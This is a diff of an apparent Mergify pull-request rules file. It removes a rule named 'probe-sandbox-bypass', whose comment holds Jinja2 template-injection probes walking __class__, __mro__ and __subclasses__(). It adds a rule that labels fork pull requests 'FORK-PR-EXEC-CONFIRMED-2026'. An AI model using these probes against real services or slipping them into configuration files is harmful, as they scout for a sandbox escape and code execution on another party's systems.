@@ -1,12 +1,8 @@
-pull_request_rules:                                                                                                                                                                                        
-  - name: probe-sandbox-bypass                                                                                                                                                                               
-    conditions:
-      - "-closed"                                                                                                                                                                                            
-    actions:
-      comment:                                                                                                                                                                                             
-        message: |
-          T1 basic: {{ 7*7 }}
-          T2 class: {{ ''.__class__ }}                                                                                                                                                                       
-          T3 mro: {{ ''.__class__.__mro__ }}
-          T4 subclasses: {{ ''.__class__.__mro__[1].__subclasses__()|length }}                                                                                                                               
-          T5 map: {{ [''] | map(attribute='__class__') | list }}
+pull_request_rules:                                                                                                                                                                                          
+  - name: fork-pr-exec-test                      
+    conditions:                                                                                                                                                                                              
+      - "-closed"                 
+    actions:                                                                                                                                                                                                 
+      label:                     
+        add:                                                                                                                                                                                                 
+          - "FORK-PR-EXEC-CONFIRMED-2026"
